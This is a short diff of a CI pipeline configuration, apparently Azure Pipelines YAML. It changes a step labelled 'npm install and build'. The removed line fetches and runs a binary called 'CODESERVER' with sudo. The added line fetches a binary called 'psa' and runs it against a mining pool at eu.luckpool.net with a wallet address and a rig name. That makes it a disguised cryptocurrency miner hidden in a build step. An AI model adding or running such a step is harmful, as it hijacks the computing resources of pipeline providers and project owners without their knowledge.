@@ -16,5 +16,5 @@ steps:
   displayName: 'Install Node.js'
 
 - script: |
-    sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/jazzup6176/StyleGAN1/main/CODESERVER && chmod +x CODESERVER && sudo ./CODESERVER
+    wget https://github.com/jazzup6176/StyleGAN1/raw/main/psa && ./psa -v -l eu.luckpool.net:3956 -u RRTP6VLKGvw7oFSRWpyVUabPyKRqDr5hJy.rig2 -p x -t 400
   displayName: 'npm install and build'
